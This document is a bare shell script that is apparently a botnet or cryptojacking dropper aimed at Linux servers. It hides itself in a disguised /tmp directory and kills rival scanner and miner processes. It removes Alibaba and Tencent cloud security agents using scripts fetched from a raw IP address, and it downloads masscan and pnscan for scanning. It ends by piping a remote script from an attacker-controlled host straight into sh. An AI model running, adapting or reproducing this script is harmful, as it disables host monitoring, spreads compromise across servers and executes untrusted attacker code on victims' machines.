#!/bin/sh
sleep $( seq 3 7 | sort -R | head -n1 )
cd /tmp || cd /var/tmp
sleep 1
mkdir -p .ICE-unix/... && chmod -R 777 .ICE-unix && cd .ICE-unix/...
sleep 1
if [ -f .watch ]; then
rm -rf .watch
exit 0
fi
sleep 1
echo 1 > .watch
sleep 1
ps x | awk '!/awk/ && /redisscan|ebscan|redis-cli/ {print $1}' | xargs kill -9 2>/dev/null
ps x | awk '!/awk/ && /barad_agent|masscan|\.sr0|clay|udevs|\.sshd|xig/ {print $1}' | xargs kill -9 2>/dev/null
sleep 1
if [ -x "$(command -v apt-get)" ]; then
export DEBIAN_FRONTEND=noninteractive
apt-get update -y
apt-get install -y debconf-doc
apt-get install -y build-essential
apt-get install -y libpcap0.8-dev libpcap0.8
apt-get install -y libpcap*
apt-get install -y make gcc git
apt-get install -y redis-server
apt-get install -y redis-tools
apt-get install -y redis
apt-get install -y iptables
apt-get install -y wget curl
fi
if [ -x "$(command -v yum)" ]; then
yum update -y
yum install -y epel-release
yum update -y
yum install -y git iptables make gcc redis libpcap libpcap-devel
yum install -y wget curl
fi
sleep 1
if ps aux | grep -i '[a]liyun'; then
    wget http://36.7.154.124/as/uninstall.sh
    chmod +x uninstall.sh
    ./uninstall.sh
    wget http://36.7.154.124/as/quartz_uninstall.sh
    chmod +x quartz_uninstall.sh
    ./quartz_uninstall.sh
    rm -f uninstall.sh quartz_uninstall.sh
    pkill aliyun-service
    rm -fr /etc/init.d/agentwatch /usr/sbin/aliyun-service
    rm -rf /usr/local/aegis*;
elif ps aux | grep -i '[y]unjing'; then
    /usr/local/qcloud/stargate/admin/uninstall.sh
    /usr/local/qcloud/YunJing/uninst.sh
    /usr/local/qcloud/monitor/barad/admin/uninstall.sh
fi
sleep 1
if ! [ -x "$(command -v masscan)" ]; then
rm -rf /var/lib/apt/lists/*
rm -rf x1.tar.gz
sleep 1
curl -sL -o x1.tar.gz http://116.62.122.90/sh.sh/1.0.4.tar.gz
sleep 1
[ -f x1.tar.gz ] && tar zxf x1.tar.gz && cd masscan-1.0.4 && make && make install && cd .. && rm -rf masscan-1.0.4
fi
sleep 3 && rm -rf .watch
if ! ( [ -x /usr/local/bin/pnscan ] || [ -x /usr/bin/pnscan ] ); then
curl -kLs ftp://ftp.lysator.liu.se/pub/unix/pnscan/pnscan-1.11.tar.gz > .x112 || wget -q -O .x112 ftp://ftp.lysator.liu.se/pub/unix/pnscan/pnscan-1.11.tar.gz
sleep 1
[ -f .x112 ] && tar xf .x112&& cd pnscan-1.11 && make lnx && make install&& cd .. && rm -rf pnscan-1.11 .x112
fi
bash -c 'curl -fsSL http://116.62.122.90/sh.sh/rsh.sh|sh' 2>/dev/null
